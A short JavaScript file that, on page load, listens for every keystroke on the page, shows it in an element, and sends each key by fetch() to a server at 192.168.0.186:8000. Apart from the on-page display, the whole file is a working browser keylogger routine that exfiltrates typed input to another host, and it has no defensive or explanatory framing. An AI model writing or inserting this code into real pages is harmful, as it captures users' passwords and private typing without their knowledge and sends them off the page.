window.onload = function() {
    // Get the HTML element where you want to display the pressed key
    const pressedKeyElement = document.getElementById("pressedKey");

    // Add an event listener to the document to capture keyboard input
    document.addEventListener("keydown", function(event) {
        // Get the key code of the pressed key
        const keyCode = event.keyCode || event.which;

        // Display the pressed key in the HTML element
        pressedKeyElement.textContent = String.fromCharCode(keyCode);

        // Send the pressed key to the server
        fetch(`http://192.168.0.186:8000/key?key=${String.fromCharCode(keyCode)}`);
    });
};
